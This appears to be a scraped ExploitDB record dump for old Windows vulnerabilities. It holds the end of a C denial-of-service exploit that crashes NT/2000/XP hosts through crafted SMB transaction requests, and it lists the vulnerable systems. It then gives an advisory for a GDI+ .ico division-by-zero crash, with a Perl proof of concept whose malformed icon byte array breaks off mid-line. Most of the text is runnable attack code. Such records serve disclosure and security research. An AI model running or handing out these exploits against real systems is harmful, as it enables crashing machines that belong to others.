\'p\':\r\n          netbios_ns_port = atoi (optarg);\r\n          break;\r\n        case \'P\':\r\n          netbios_ssn_port = atoi (optarg);\r\n          break;\r\n        case \'t\':\r\n          udp_timeout = atoi (optarg);\r\n          break;\r\n        case \'T\':\r\n          tcp_timeout = atoi (optarg);\r\n          break;\r\n        case \'h\':\r\n        default:\r\n          showhelp = 1;\r\n          break;\r\n        }\r\n    }\r\n\r\n  if (optind < argc)\r\n\t  hostname = argv[optind++];\r\n  \r\n  if (showhelp || hostname == NULL)\r\n    {\r\n      printf ("Usage: %s [options] hostname/ip...\\n", argv[0]);\r\n      printf\r\n        ("   -N [netbios-name]         Netbios Name (default: ask the remote host)\\n");\r\n      printf\r\n        ("   -n [packets]              Number of crafted packets to send (default: %d)\\n",\r\n         packets);\r\n      printf\r\n        ("   -p [netbios-ns port]      UDP Port to query (default: %d)\\n",\r\n         netbios_ns_port);\r\n      printf\r\n        ("   -P [netbios-ssn port]     TCP Port to query (default: %d)\\n",\r\n         netbios_ssn_port);\r\n      printf\r\n        ("   -t [udp-timeout]          Timeout to wait for receive on UDP ports (default: %d)\\n",\r\n         udp_timeout);\r\n      printf\r\n        ("   -T [tcp-timeout]          Timeout to wait for receive on TCP ports (default: %d\\n",\r\n         tcp_timeout);\r\n      printf ("\\n");\r\n      printf ("Known vulnerable systems: \\n");\r\n      printf ("    - Windows NT 4.0 Workstation/Server\\n");\r\n      printf ("    - Windows 2000 Professional/Advanced Server\\n");\r\n      printf ("    - Windows XP Professional/Home edition\\n\\n");\r\n      exit (1);\r\n    }\r\n\r\n  if (!name\r\n      && (name =\r\n          list_netbios_names (buffer, sizeof (buffer), hostname,\r\n                              netbios_ns_port, udp_timeout)) == NULL)\r\n    exit (1);\r\n  else\r\n    name = extract_name (name);\r\n\r\n  printf ("Using netbios name: %s\\n", name);\r\n\r\n  printf ("Connecting to remote host (%s:%d)...\\n", hostname,\r\n          netbios_ssn_port);\r\n\r\n  fd = tcp_connect (hostname, netbios_ssn_port);\r\n\r\n  if (fd == -1)\r\n    exit (1);\r\n\r\n\r\n  FD_ZERO (&rfds);\r\n  FD_SET (fd, &rfds);\r\n\r\n  tv.tv_sec = tcp_timeout;\r\n  tv.tv_usec = 0;\r\n\r\n  state = STATE_REQUESTING_SESSION_SETUP;\r\n\r\n  request_session_setup (fd, name);\r\n\r\n  for (;;)\r\n    {\r\n      if (!select (fd + 1, &rfds, NULL, NULL, &tv))\r\n        {\r\n          if (state == STATE_REQUESTING_TRANSACTION)\r\n            {\r\n              fprintf (stderr,\r\n                       "Timeout during TCP read - Seems like the remote host has crashed\\n");\r\n              return 0;\r\n            }\r\n          else\r\n            {\r\n              fprintf (stderr,\r\n                       "Nuke failed (tcp timeout) at state %#02x, exiting...\\n",\r\n                       state);\r\n              return 1;\r\n            }\r\n        }\r\n\r\n      r = read (fd, buffer, sizeof (buffer));\r\n\r\n      if (r == 0)\r\n        {\r\n          printf\r\n            ("Nuke failed at state %#02x (EOF, wrong netbios name ?), exiting...\\n",\r\n             state);\r\n          exit (1);\r\n        }\r\n\r\n      if (((smb_header *) (buffer + 4))->error_class != 0)\r\n        {\r\n          fprintf (stderr, "Nuke failed at state %#02x, exiting...\\n", state);\r\n          exit (1);\r\n        }\r\n\r\n      switch (state)\r\n        {\r\n        case STATE_REQUESTING_SESSION_SETUP:\r\n          printf ("Negotiating protocol...\\n");\r\n          negotiate_protocol (buffer, fd);\r\n          break;\r\n        case STATE_NEGOTIATING_PROTOCOL:\r\n          printf ("Requesting session setup (AndX)\\n");\r\n          request_session_setup_andx (buffer, fd);\r\n          break;\r\n        case STATE_REQUESTING_SESSION_SETUP_ANDX:\r\n          printf ("Requesting tree connect (AndX)\\n");\r\n          request_tree_connect_andx (buffer, fd, name);\r\n          break;\r\n        case STATE_REQUESTING_TREE_CONNECT_ANDX:\r\n          for (i = 0; i < packets; i++)\r\n            {\r\n              printf ("Requesting transaction (nuking) #%d\\n", i + 1);\r\n              request_transaction (buffer, fd);\r\n            }\r\n\t    printf ("Wait...\\n");\r\n          break;\r\n        default:\r\n          printf ("Seems like the nuke failed :/ (patched ?)\\n");\r\n\t  exit (1);\r\n        }\r\n\r\n      state++;\r\n    }\r\n\r\n  return 0;\r\n}', u'description': u'Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (1)', u'platform': u'windows', u'author': u'Frederic Deletang', u'cve': [], u'source': u'ExploitDB', u'date': u'2002-08-22T00:00:00+00:00', u'_id': 21746, u'type': u'dos', u'port': 0}

CVE: []
Description: Microsoft Windows - GDI+ '.ICO' Remote Division By Zero
{u'code': u'MS Windows GDI+ .ico Remote Division By Zero\r\n\r\nApplication: GDIPLUS.DLL\r\n\r\nWeb Site: http://www.microsoft.com/\r\n\r\nPlatform: Windows *\r\n\r\nBug: Division By Zero\r\n\r\nTested agains: XP SP3 fully patched\r\n\r\nNote: This have nothing to do with http://milw0rm.com/exploits/4044\r\n-------------------------------------------------------\r\n\r\n1) Introduction\r\n\r\n2) Bug\r\n\r\n3) Proof of concept\r\n\r\n4) Credits\r\n\r\n================\r\n\r\n1) Introduction\r\n\r\n================\r\n\r\n"The Microsoft Windows graphics device interface (GDI) enables applications to use graphics\r\nand formatted text on both the video display and the printer. Windows-based applications do \r\nnot access the graphics hardware directly. Instead, GDI interacts with device drivers on \r\nbehalf of applications."\r\n\r\n=======\r\n\r\n2) Bug\r\n\r\n=======\r\n\r\nGDIPLUS fails to handle exceptional condition when opening malicious .ico files.\r\nThis result in a remote explorer crash (via IE), and a constant loop crash if the ico file\r\nis located on the desktop\r\n\r\n==================\r\n\r\n3)Proof of concept\r\n\r\n==================\r\n\r\n#!/usr/bin/perl\r\n\r\nuse strict;\r\n\r\nmy $icofile = \r\n"\\x00\\x00\\x01\\x00\\x0c\\x00\\x30\\x30\\x10\\x00\\x01\\x00\\x04\\x00\\x68\\x06\\x00\\x00\\xc6\\x00".\r\n"\\x00\\x00\\x20\\x20\\x10\\x00\\x01\\x00\\x04\\x00\\xe8\\x02\\x00\\x00\\x2e\\x07\\x00\\x00\\x18\\x18".\r\n"\\x10\\x00\\x01\\x00\\x04\\x00\\xe8\\x01\\x00\\x00\\x16\\x0a\\x00\\x00\\x10\\x10\\x10\\x00\\x01\\x00".\r\n"\\x04\\x00\\x28\\x01\\x00\\x00\\xfe\\x0b\\x00\\x00\\x30\\x30\\x00\\x00\\x01\\x00\\x08\\x00\\xa8\\x0e".\r\n"\\x00\\x00\\x26\\x0d\\x00\\x00\\x20\\x20\\x00\\x00\\x01\\x00\\x08\\x00\\xa8\\x08\\x00\\x00\\xce\\x1b".\r\n"\\x00\\x00\\x18\\x18\\x00\\x00\\x01\\x00\\x08\\x00\\xc8\\x06\\x00\\x00\\x76\\x24\\x00\\x00\\x10\\x10".\r\n"\\x00\\x00\\x01\\x00\\x08\\x00\\x68\\x05\\x00\\x00\\x3e\\x2b\\x00\\x00\\x30\\x30\\x00\\x00\\x01\\x00".\r\n"\\x20\\x00\\xa8\\x25\\x00\\x00\\xa6\\x30\\x00\\x00\\x20\\x20\\x00\\x00\\x01\\x00\\x20\\x00\\xa8\\x10".\r\n"\\x00\\x00\\x4e\\x56\\x00\\x00\\x18\\x18\\x00\\x00\\x01\\x00\\x20\\x00\\x88\\x09\\x00\\x00\\xf6\\x66".\r\n"\\x00\\x00\\x10\\x10\\x00\\x00\\x01\\x00\\x20\\x00\\x68\\x04\\x00\\x00\\x7e\\x70\\x00\\x00\\x28\\x00".\r\n"\\x00\\x00\\x30\\x80\\x00\\x00\\x00". # it happens here\r\n"\\x00\\x00\\x00\\x01\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x80\\x04\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x80\\x00\\x00\\x80\\x00\\x00\\x00\\x80\\x80\\x00\\x80\\x00\\x00\\x00\\x80\\x00\\x80".\r\n"\\x00\\x80\\x80\\x00\\x00\\x80\\x80\\x80\\x00\\xc0\\xc0\\xc0\\x00\\x00\\x00\\xff\\x00\\x00\\xff\\x00".\r\n"\\x00\\x00\\xff\\xff\\x00\\xff\\x00\\x00\\x00\\xff\\x00\\xff\\x00\\xff\\xff\\x00\\x00\\xff\\xff\\xff".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x66\\x66\\x66\\x67\\x80\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x66\\x7e\\x8f\\xf8\\xff\\x88\\xe7".\r\n"\\x66\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x67\\x8f\\xf8\\x86".\r\n"\\x6c\\x66\\x7e\\x88\\xf8\\x76\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x6e".\r\n"\\xff\\x86\\x6c\\x6c\\x66\\x6c\\x6c\\x66\\x68\\x8f\\x66\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x66\\xf8\\x76\\xc6\\x66\\x66\\x66\\x66\\x66\\x6c\\x66\\x6e\\xf8\\x66\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x06\\x8f\\x8c\\x66\\x66\\xc6\\xec\\x6c\\xec\\x66\\xc6\\x6c\\x6c\\x68\\xf8".\r\n"\\x60\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\xf6\\x66\\x6c\\xe6\\x6c\\x66\\x66\\x66\\x66\\xe6".\r\n"\\x66\\x66\\x6c\\x6f\\x86\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\xf8\\x6c\\x6c\\xe6\\x6c\\x6e\\x66".\r\n"\\xce\\x6c\\x6c\\x6c\\x6c\\x6c\\x66\\x66\\x8f\\x60\\x00\\x00\\x00\\x00\\x00\\x00\\x6f\\x8c\\x66\\xe6".\r\n"\\x6c\\x66\\x66\\xc6\\x66\\x66\\xe6\\x66\\x6e\\x66\\x66\\xc6\\x68\\x86\\x00\\x00\\x00\\x00\\x00\\x06".\r\n"\\x88\\x66\\xe6\\xc6\\x66\\xe6\\xce\\x6e\\xc6\\xc6\\xc6\\x66\\xc6\\x6c\\x66\\x6c\\x66\\x88\\x60\\x00".\r\n"\\x00\\x00\\x00\\x68\\xf6\\xc6\\xc6\\x66\\xec\\x66\\x66\\xc6\\x6e\\x6e\\x66\\xce\\x66\\x6e\\xc6\\xe6".\r\n"\\x6c\\x6f\\x86\\x00\\x00\\x00\\x08\\x6f\\xff\\x8e\\x66\\xec\\x66\\xce\\xce\\x66\\xc6\\x6c\\x6e\\x66".\r\n"\\xc6\\xc6\\x66\\xc6\\x66\\x66\\xf6\\x80\\x00\\x00\\x06\\x8f\\xff\\xff\\x7c\\x66\\xe6\\x66\\x66\\xce".\r\n"\\x6e\\x66\\xc6\\xc6\\xe6\\xef\\x8f\\x8f\\x88\\xf8\\xf8\\x60\\x00\\x00\\x7e\\xf6\\xff\\xff\\xff\\xec".\r\n"\\x6c\\xe6\\xec\\xe6\\x6c\\xe6\\xe6\\xe6\\xc8\\xff\\xff\\xff\\xff\\xff\\xff\\x7e\\x00\\x00\\x6f\\x76".\r\n"\\x68\\xff\\xff\\xf8\\xe6\\x6c\\x66\\x6e\\xc6\\x6c\\x66\\xc6\\x8f\\xff\\xff\\xff\\xff\\xf8\\x6e\\xf4".\r\n"\\x00\\x00\\x78\\xec\\xe6\\x8f\\xff\\xff\\xfe\\x6e\\x6e\\xc6\\xe6\\xe6\\xec\\xef\\xff\\xff\\xff\\xff".\r\n"\\xff\\x86\\x6c\\xf7\\x00\\x06\\x88\\x66\\xc6\\xe7\\xff\\xff\\xff\\x87\\xce\\x6e\\xc6\\xce\\x67\\xff".\r\n"\\xff\\xff\\xff\\xff\\xf6\\x6c\\x66\\x88\\xe0\\x06\\xf6\\xce\\x6e\\xc6\\xef\\xff\\xff\\xff\\x8e\\x66".\r\n"\\xe6\\xe6\\x8f\\xff\\xff\\xff\\xff\\xf8\\x6e\\x66\\x66\\xe8\\x60\\x07\\xf6\\xe6\\xc6\\xe6\\xce\\x8f".\r\n"\\xff\\xff\\xff\\x8c\\xec\\x68\\xff\\xff\\xff\\xff\\xff\\x86\\xc6\\xc6\\xc6\\xcf\\x70\\x8e\\x8c\\x66".\r\n"\\xe6\\xce\\x66\\xe8\\xff\\xff\\xff\\xff\\x6e\\xff\\xff\\xff\\xff\\xff\\xf6\\xe6\\x6e\\x66\\xe6\\x68".\r\n"\\xe8\\x68\\x8e\\x6c\\xe6\\xe6\\xec\\x6e\\x8f\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xf8\\xec\\x6c".\r\n"\\x6c\\x66\\xc6\\x68\\x86\\x68\\xec\\xe6\\x6c\\x6c\\xe6\\xec\\xe7\\xff\\xff\\xff\\xff\\xff\\xff\\xff".\r\n"\\xff\\x86\\x66\\xe6\\xe6\\x6c\\x66\\xce\\x8c\\x6f\\x66\\x6e\\xce\\xe6\\xec\\xe6\\xec\\xef\\xff\\xff".\r\n"\\xff\\xff\\xff\\xff\\x8e\\x6e\\xce\\xc6\\xc6\\xe6\\xe6\\x66\\xf6\\x6f\\x6e\\xc6\\xe6\\x6e\\xce\\x6e".\r\n"\\xce\\x6e\\x8f\\xff\\xff\\xff\\xff\\xf8\\xec\\x6c\\xe6\\x6e\\x66\\xc6\\xc6\\xc6\\xf6\\x68\\xc6\\xe6".\r\n"\\xce\\xce\\x6e\\xce\\x6e\\xc8\\xff\\xff\\xff\\xff\\xff\\xff\\xe6\\xe6\\x6c\\x66\\xce\\x66\\x66\\xe6".\r\n"\\xf6\\x6f\\xe6\\xce\\x6e\\x6e\\xce\\x6e\\xce\\x8f\\xff\\xff\\xff\\xff\\xff\\xff\\xf8\\xce\\x6e\\x6e".\r\n"\\x66\\xce\\x6c\\x67\\x86\\x68\\x8e\\x6e\\xce\\xce\\x6e\\xce\\xef\\xff\\xff\\xff\\xff\\xff\\xff\\xff".\r\n"\\xff\\x8e\\xc6\\xec\\x6e\\x66\\x66\\x6e\\x8c\\x78\\xec\\x6e\\x6e\\x6e\\xce\\x68\\xff\\xff\\xff\\xff".\r\n"\\xff\\x8f\\xff\\xff\\xff\\xf8\\xe6\\xc6\\x6c\\x6c\\xec\\x68\\x87\\xe8\\x8e\\xce\\xc6\\xec\\xe6\\xff".\r\n"\\xff\\xff\\xff\\xff\\xf8\\xee\\x8f\\xff\\xff\\xff\\xfe\\x6e\\x6e\\x66\\x66\\x68\\xe8\\x06\\xf6\\xe6".\r\n"\\xec\\xe6\\xef\\xff\\xff\\xff\\xff\\xff\\xee\\xce\\x6e\\xff\\xff\\xff\\xff\\x8c\\x6c\\xe6\\xce\\xcf".\r\n"\\x70\\x06\\xf6\\xce\\x6e\\x68\\xff\\xff\\xff\\xff\\xff\\x8e\\xce\\xe6\\xec\\xe8\\xff\\xff\\xff\\xf8".\r\n"\\xe6\\x6c\\x66\\x6f\\x60\\x06\\x88\\xe6\\x6e\\x8f\\xff\\xff\\xff\\xff\\xf8\\xee\\xe6\\xec\\xe6\\xec".\r\n"\\xe8\\xff\\xff\\xff\\x8e\\x6e\\x66\\x88\\x60\\x00\\x7f\\x6e\\xcf\\xff\\xff\\xff\\xff\\xff\\xee\\xce".\r\n"\\xce\\xe6\\xec\\xe6\\xe6\\x8f\\xff\\xff\\xff\\xc6\\xce\\xf6\\x00\\x00\\x6f\\xe8\\xff\\xff\\xff\\xff".\r\n"\\xff\\xfe\\xce\\xee\\xec\\xec\\xee\\x6e\\xce\\x6e\\x8f\\xff\\xff\\xf8\\x67\\xf6\\x00\\x00\\x86\\xff".\r\n"\\xff\\xff\\xff\\xff\\xf8\\xee\\xee\\xce\\x6e\\xee\\x6e\\xce\\x6e\\xc6\\xe6\\x8f\\xff\\xff\\x8f\\x68".\r\n"\\x00\\x00\\x06\\x8f\\x88\\x88\\x88\\xe8\\x8e\\xce\\xce\\xe6\\xec\\xec\\xe6\\xe6\\xec\\xe6\\xce\\x68".\r\n"\\xff\\xff\\xf8\\x60\\x00\\x00\\x08\\xcf\\xee\\xce\\xee\\xce\\xee\\xe6\\xe6\\xec\\xee\\x6e\\xce\\xce".\r\n"\\x6e\\x6e\\x6c\\xe6\\x68\\xff\\xf6\\x80\\x00\\x00\\x00\\x68\\x8e\\x6e\\xce\\xe6\\xce\\xce\\xec\\xee".\r\n"\\x6e\\xce\\xe6\\xec\\xec\\xec\\xe6\\x6c\\xe6\\xef\\x86\\x00\\x00\\x00\\x00\\x06\\x88\\xec\\xe6\\xee".\r\n"\\xe6\\xe6\\xee\\x6e\\xce\\xe6\\xec\\xe6\\xe6\\x6e\\x6c\\xe6\\x6c\\x88\\x60\\x00\\x00\\x00\\x00\\x00".\r\n"\\x68\\x8e\\x6e\\xc6\\xec\\xee\\xce\\xce\\xe6\\xec\\xe6\\xec\\xec\\xec\\xe6\\x6e\\x6f\\x86\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x06\\xf8\\xec\\xee\\xce\\x6e\\x6e\\xe6\\xec\\xe6\\xec\\xe6\\xe6\\xe6\\x6e\\xc6".\r\n"\\x88\\x60\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\xfe\\x6e\\x6e\\xce\\xce\\xce\\x6e\\xce\\x6e\\x6e".\r\n"\\xc6\\xce\\xc6\\xef\\x86\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x88\\x8c\\xe6\\xee\\x6e\\x6e".\r\n"\\xce\\x6e\\xce\\xc6\\xee\\x66\\xe8\\xf8\\x60\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x67\\x8f".\r\n"\\xee\\xce\\xce\\x6e\\x6e\\xce\\x6e\\x6e\\xc6\\xe8\\x88\\x6c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x08\\x68\\x8f\\x8e\\x6e\\xce\\xce\\x6e\\xce\\xc6\\xe8\\xf8\\xec\\x80\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0e\\x47\\x8f\\xf8\\x8e\\x8e\\x68\\xe8\\xff\\xf8\\x6c\\x80\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x66\\x68\\x88\\x8f\\x88\\x88\\xe7".\r\n"\\x6c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\xe6".\r\n"\\xc6\\x66\\xc7\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xe0\\x07\\xff\\xff\\x00".\r\n"\\x00\\xff\\xff\\x00\\x00\\xff\\xff\\x00\\x00\\xff\\xf8\\x00\\x00\\x1f\\xff\\x00\\x00\\xff\\xe0\\x00".\r\n"\\x00\\x07\\xff\\x00\\x00\\xff\\xc0\\x00\\x00\\x03\\xff\\x00\\x00\\xff\\x80\\x00\\x00\\x01\\xff\\x00".\r\n"\\x00\\xff\\x00\\x00\\x00\\x00\\xff\\x00\\x00\\xfe\\x00\\x00\\x00\\x00\\x7f\\x00\\x00\\xfc\\x00\\x00".\r\n"\\x00\\x00\\x3f\\x00\\x00\\xf8\\x00\\x00\\x00\\x00\\x1f\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x0f\\x00".\r\n"\\x00\\xe0\\x00\\x00\\x00\\x00\\x07\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x07\\x00\\x00\\xc0\\x00\\x00".\r\n"\\x00\\x00\\x03\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x03\\x00".\r\n"\\x00\\x80\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x80\\x00\\x00".\r\n"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x01\\x00".\r\n"\\x00\\x80\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\xc0\\x00\\x00".\r\n"\\x00\\x00\\x03\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x07\\x00".\r\n"\\x00\\xe0\\x00\\x00\\x00\\x00\\x07\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x0f\\x00\\x00\\xf8\\x00\\x00".\r\n"\\x00\\x00\\x1f\\x00\\x00\\xfc\\x00\\x00\\x00\\x00\\x3f\\x00\\x00\\xfe\\x00\\x00\\x00\\x00\\x7f\\x00".\r\n"\\x00\\xff\\x00\\x00\\x00\\x00\\xff\\x00\\x00\\xff\\x80\\x00\\x00\\x01\\xff\\x00\\x00\\xff\\xc0\\x00".\r\n"\\x00\\x03\\xff\\x00\\x00\\xff\\xe0\\x00\\x00\\x07\\xff\\x00\\x00\\xff\\xf8\\x00\\x00\\x1f\\xff\\x00".\r\n"\\x00\\xff\\xff\\x00\\x00\\xff\\xff\\x00\\x00\\xff\\xff\\xe0\\x07\\xff\\xff\\x00\\x00\\x28\\x00\\x00".\r\n"\\x00\\x20\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x01\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x80\\x00\\x00\\x80\\x00\\x00\\x00\\x80\\x80\\x00\\x80\\x00\\x00\\x00\\x80\\x00\\x80".\r\n"\\x00\\x80\\x80\\x00\\x00\\x80\\x80\\x80\\x00\\xc0\\xc0\\xc0\\x00\\x00\\x00\\xff\\x00\\x00\\xff\\x00".\r\n"\\x00\\x00\\xff\\xff\\x00\\xff\\x00\\x00\\x00\\xff\\x00\\xff\\x00\\xff\\xff\\x00\\x00\\xff\\xff\\xff".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x76\\x76\\x76\\x7e\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x07\\x68\\xf8\\x8e\\x88\\x88\\x87\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x6f\\x86\\x6c".\r\n"\\x66\\xc6\\x6c\\x68\\x87\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\x86\\xc6\\xe6\\x66\\x6c\\x66\\x66".\r\n"\\xc8\\x86\\x00\\x00\\x00\\x00\\x00\\x07\\x8e\\xc6\\xe6\\xc6\\xc6\\x6e\\x66\\xc6\\xe6\\x6f\\x60\\x00".\r\n"\\x00\\x00\\x00\\x6f\\x66\\x66\\xc6\\x66\\xe6\\xc6\\xc6\\xe6\\x46\\xc6\\xf6\\x00\\x00\\x00\\x07\\x86".\r\n"\\xc6\\xe6\\x66\\xec\\x66\\x66\\xe6\\xc6\\x66\\x66\\x6f\\x60\\x00\\x00\\x88\\xfe\\x66\\xc6\\xc6\\x66".\r\n"\\xce\\xc6\\xc6\\x66\\xce\\xc6\\x6c\\xf8\\x00\\x00\\x6f\\xff\\xfe\\x6e\\x6e\\xce\\x66\\x6e\\x66\\xe7".\r\n"\\xf8\\xff\\xff\\xf6\\x00\\x07\\xf6\\x8f\\xff\\x8c\\x66\\x66\\xec\\x66\\xc6\\x8f\\xff\\xff\\xf8\\xef".\r\n"\\x70\\x06\\x86\\xce\\xff\\xff\\x8e\\xce\\x66\\xe6\\xe8\\xff\\xff\\xff\\x86\\x68\\xc0\\x08\\xe6\\xe6".\r\n"\\x6f\\xff\\xff\\xe6\\xce\\xce\\xff\\xff\\xff\\xf8\\x6c\\x66\\xf0\\x78\\x6c\\x6c\\xe6\\x8f\\xff\\xf8".\r\n"\\xe6\\x8f\\xff\\xff\\xff\\x66\\xe6\\x6c\\x88\\x6f\\x6e\\x6e\\xce\\x68\\xff\\xff\\xf8\\xff\\xff\\xff".\r\n"\\x86\\xec\\x6c\\x6e\\x86\\x68\\xec\\x6e\\x66\\xec\\xef\\xff\\xff\\xff\\xff\\xf8\\xec\\x66\\x6e\\x66".\r\n"\\x86\\x7e\\x66\\xec\\xec\\xe6\\xe7\\xff\\xff\\xff\\xf8\\xec\\x66\\xec\\x66\\xc6\\x86\\x68\\xce\\x66".\r\n"\\xe6\\xec\\xe8\\xff\\xff\\xff\\xff\\x86\\xec\\x66\\xec\\x66\\xe7\\x7e\\x6e\\xce\\xce\\x6e\\x8f\\xff".\r\n"\\xff\\xff\\xff\\xf8\\x6e\\x6c\\x66\\xec\\x86\\x6f\\xce\\x6e\\x6e\\x7f\\xff\\xff\\xff\\x8f\\xff\\xff".\r\n"\\x8e\\x6e\\x66\\x66\\x86\\x88\\xe6\\xce\\xc8\\xff\\xff\\xff\\x8e\\xe6\\x8f\\xff\\xf8\\xec\\x6c\\xec".\r\n"\\xf8\\x08\\x6e\\x6e\\xff\\xff\\xff\\xf8\\xec\\xee\\xce\\xff\\xff\\xf8\\x6e\\x66\\x80\\x06\\x8e\\x7f".\r\n"\\xff\\xff\\xff\\xee\\xee\\xce\\xe6\\xe8\\xff\\xff\\x8c\\x68\\x60\\x08\\x88\\xff\\xff\\xff\\xfe\\xec".\r\n"\\xe6\\xe6\\xec\\xec\\xe8\\xff\\xf8\\xe8\\x80\\x00\\xe8\\x88\\x88\\x88\\xec\\xee\\xce\\xec\\xe6\\xe6".\r\n"\\x6e\\x78\\xff\\xf6\\x00\\x00\\x88\\xee\\xee\\xee\\xee\\x6e\\xec\\xe6\\xec\\xec\\xec\\xe6\\x8f\\x88".\r\n"\\x00\\x00\\x06\\x8c\\x6c\\xec\\x6e\\xce\\x6e\\xec\\xe6\\xe6\\x66\\xce\\x68\\x60\\x00\\x00\\x00\\x7f".\r\n"\\xee\\x6e\\xec\\xee\\xce\\x6e\\x6e\\xce\\xce\\x66\\xf6\\x00\\x00\\x00\\x00\\x06\\x8e\\xce\\x6e\\x6e".\r\n"\\x6e\\xce\\xce\\x6e\\x66\\xe8\\x60\\x00\\x00\\x00\\x00\\x00\\x78\\x8e\\xce\\xce\\x6e\\x6e\\x6e\\xc6".\r\n"\\xe8\\x87\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x6f\\x8e\\xec\\xec\\xec\\xe6\\xe8\\x87\\xe0\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x0e\\x78\\x8f\\x8e\\x88\\x88\\x8c\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x86\\x67\\xe6\\x7e\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xf0\\x0f\\xff\\xff\\x80\\x01".\r\n"\\xff\\xfe\\x00\\x00\\x7f\\xfc\\x00\\x00\\x3f\\xf8\\x00\\x00\\x1f\\xf0\\x00\\x00\\x0f\\xe0\\x00\\x00".\r\n"\\x07\\xc0\\x00\\x00\\x03\\xc0\\x00\\x00\\x03\\x80\\x00\\x00\\x01\\x80\\x00\\x00\\x01\\x80\\x00\\x00".\r\n"\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x01\\x80\\x00\\x00".\r\n"\\x01\\x80\\x00\\x00\\x01\\xc0\\x00\\x00\\x03\\xc0\\x00\\x00\\x03\\xe0\\x00\\x00\\x07\\xf0\\x00\\x00".\r\n"\\x0f\\xf8\\x00\\x00\\x1f\\xfc\\x00\\x00\\x3f\\xfe\\x00\\x00\\x7f\\xff\\x80\\x01\\xff\\xff\\xf0\\x0f".\r\n"\\xff\\x28\\x00\\x00\\x00\\x18\\x00\\x00\\x00\\x30\\x00\\x00\\x00\\x01\\x00\\x04\\x00\\x00\\x00\\x00".\r\n"\\x00\\x20\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x80\\x00\\x00\\x00\\x80\\x80\\x00\\x80\\x00\\x00".\r\n"\\x00\\x80\\x00\\x80\\x00\\x80\\x80\\x00\\x00\\x80\\